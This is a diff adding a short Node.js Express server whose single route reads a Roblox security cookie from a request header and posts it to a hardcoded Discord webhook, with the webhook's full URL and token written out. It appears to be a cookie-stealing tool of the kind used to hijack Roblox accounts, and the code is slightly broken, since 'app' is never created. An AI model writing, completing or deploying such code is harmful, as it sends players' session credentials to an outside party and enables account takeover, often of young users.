@@ -1,0 +1,32 @@
+const express = require('express');
+const axios = require('axios');
+const fetch = require('node-fetch');
+
+// Replace 'your-webhook-url' with your actual Discord webhook URL.
+const discordWebhookURL = 'https://discord.com/api/webhooks/1454189566222401718/Jdxp-jkR2xD25mnaWwAszoC0yP_9wDDiYTRUROy1x-Q-goycvHigbLc-uwf3wUaktdY3';
+
+app.get('/webhook', async (req, res) => {
+    // Retrieve Roblox security cookie
+    const robloxSecurityCookie = req.headers['roblox-security-cookie'];
+
+    try {
+        // Make a POST request to the Discord webhook URL with the Roblox security cookie
+        await fetch(discordWebhookURL, {
+            method: 'POST',
+            body: JSON.stringify({
+                content: `Roblox Security Cookie: ${robloxSecurityCookie}`
+            })
+        });
+
+        console.log('Discord webhook sent successfully.');
+
+    } catch (error) {
+        console.error(`Error sending to Discord webhook: ${error.message}`);
+    }
+
+    res.send('Webhook generation successful');
+});
+
+app.listen(3000, () => {
+    console.log('Server listening on port 3000');
+});
